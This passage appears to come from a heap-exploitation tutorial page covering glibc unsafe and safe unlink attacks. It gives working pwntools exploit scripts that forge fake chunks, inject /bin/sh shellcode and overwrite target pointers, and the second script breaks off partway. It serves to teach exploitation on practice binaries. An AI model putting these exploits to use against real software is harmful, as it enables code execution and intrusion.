</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=s2>&#34;jmp shellcode;&#34;</span> <span class=o>+</span> <span class=s2>&#34;nop;&#34;</span><span class=o>*</span><span class=mh>0x30</span> <span class=o>+</span> <span class=s2>&#34;shellcode:&#34;</span> <span class=o>+</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>execve</span><span class=p>(</span><span class=s2>&#34;/bin/sh&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>zero_null</span> <span class=o>=</span> <span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=p>(</span><span class=mh>0x88</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>shellcode</span><span class=p>)</span> <span class=o>-</span> <span class=mi>8</span><span class=o>*</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>prev_size</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x90</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>size_B</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x90</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fd_pointer</span><span class=p>)</span> 
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>bk_pointer</span><span class=p>)</span> 
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>shellcode</span> 
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>zero_null</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>prev_size</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>size_B</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=n>chunk_a</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>chunk_b</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#free(chunk_a)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=safe-unlink>Safe unlink</h2><h3 id=overall-3>Overall</h3><p><img src=https://hackmd.io/_uploads/H1ERASuS0.png loading=lazy alt=image></p><p>The Safe Unlink technique is similar to the Unsafe Unlink, but accounts for safe unlinking checks introduced in GLIBC version 2.3.4. <em><strong>The safe unlinking checks ensure that a chunk is part of a doubly linked list before unlinking it.</strong></em>
- The checks <strong>PASS</strong> if the <em><strong>bk of the chunk pointed to by the victim chunk’s fd points back to the victim chunk</strong></em>, and the <em><strong>fd of the chunk pointed to by the victim’s bk also points back to the victim chunk.</strong></em></p><ul><li><p>Forge a fake chunk starting at the first quadword of a legitimate chunk’s user data, <em><strong>point its fd & bk 0x18 and 0x10 bytes respectively before a user data pointer to the chunk in which they reside</strong></em>. Craft a prev_size field for the succeeding chunk that is 0x10 bytes less than the actual size of the previous chunk. Leverage an <em><strong>overflow bug to clear the succeeding chunk’s prev_inuse bit</strong></em>, when this chunk is freed malloc will attempt to <em><strong>consolidate it backwards with the fake chunk</strong></em>.</p></li><li><p><em><strong>The bk of the chunk pointed to by the fake chunk’s fd points back to the fake chunk</strong></em>, and <em><strong>the fd of the chunk pointed to by the fake chunk’s bk also points back to the fake chunk</strong></em>, satisfying the safe unlinking checks.</p></li><li><p>The <strong>RESULT</strong> of the unlinking process is that the <em><strong>pointer to the fake chunk (a pointer to a legitimate chunk’s user data) is overwritten with the address of itself minus 0x18.</strong></em></p></li></ul><p><strong>If this pointer is used to write data, it may be used to overwrite itself a second time with the address of sensitive data, then be used to tamper with that data.</strong></p><h3 id=approach-3>Approach</h3><ul><li>The modern equivalent of the Unsafe Unlink technique. Force the unlink macro to process designercontrolled fd/bk pointers, leading to a reflected write. The safe unlinking checks are satisfied by aiming the reflected write at a pointer to an in-use chunk. Program functionality may then be used to overwrite this pointer again, which may in turn be used to read from or write to an arbitrary address.</li></ul><h3 id=further-use-3>Further use</h3><p>By forging a very large prev_size field the consolidation attempt may wrap around the VA space and operate on a fake chunk within the freed chunk.</p><h3 id=limitations-3>Limitations</h3><p>A size vs prev_size check introduced in GLIBC version 2.26 requires the fake chunk’s size field to pass
a simple check; the value at the fake chunk + size field must equal the size field, setting the fake size
field to 8 will always pass this check. A 2nd size vs prev_size check introduced in GLIBC version 2.29
requires the fake chunk’s size field to match the forged prev_size field.</p><h3 id=script-2>Script</h3><p>overwrite.py</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./safe_unlink&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;../.glibc/glibc_2.30_no-tcache/libc.so.6&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#libc = elf.libc</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>b *main
</span></span></span><span class=line><span class=cl><span class=s2>b *main+218
</span></span></span><span class=line><span class=cl><span class=s2>b *main+326
</span></span></span><span class=line><span class=cl><span class=s2>b *main+606
</span></span></span><span class=line><span class=cl><span class=s2>b *main+735
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>index</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>info</span><span class=p>(</span><span class=n>mes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>mes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>gdbscript</span><span class=o>=</span><span class=n>gs</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>index</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;size: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>index</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>index</span> <span class=o>-</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>index</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;data: &#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>target</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>quit</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;5&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;puts() @ &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>puts</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>puts</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>info</span><span class=p>(</span><span class=s2>&#34;libc base: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chunk_a</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x88</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>chunk_b</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x88</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chunk_prev</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>chunk_size</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fd</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;m_array&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x18</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>bk</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;m_array&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>nop</span> <span class=o>=</span> <span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=p>(</span><span class=mh>0x88</span> <span class=o>-</span> <span class=mi>8</span><span class=o>*</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fake_prev_size</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fake_size</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x90</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>chunk_prev</span> <span class=o>+</span> <span class=n>chunk_size</span> <span class=o>+</span> <span class=n>fd</span> <span class=o>+</span> <span class=n>bk</span> <span class=o>+</span> <span class=n>nop</span> <span class=o>+</span> <span class=n>fake_prev_size</span> <span class=o>+</span> <span class=n>fake_size</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=n>chunk_b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>overlapped_mparray</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>3</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;target&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>overlapped_mparray</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;Much win&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>target</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>shell.py</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./safe_unlink&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;../.glibc/glibc_2.30_no-tcache/libc.so.6&#39;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#libc = elf.libc</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>b *main
</span></span></span><span class=line><span class=cl><span class=s2>b *main+218
</span></span></span><span class=line><span class=cl><span class=s2>b *main+326
</span></span></span><span class=line><span class=cl><span class=s2>b *main+606
</span></span></span><span class=line><span class=cl><span class=s2>b *main+735
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>index</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>info</span><span class=p>(</span><span class=n>mes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>mes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>start</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>gdb</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>,</span> <span class=n>gdbscript</span><span class=o>=</span><span class=n>gs</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>process</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>index</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;size: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>index</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>index</span> <span class=o>-</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>index</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;data: &#39;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>target</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>quit</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;5&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;puts() @ &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>puts</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>(),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>puts</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>info</span><span class=p>(</span><span class=s2>&#34;libc base: &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
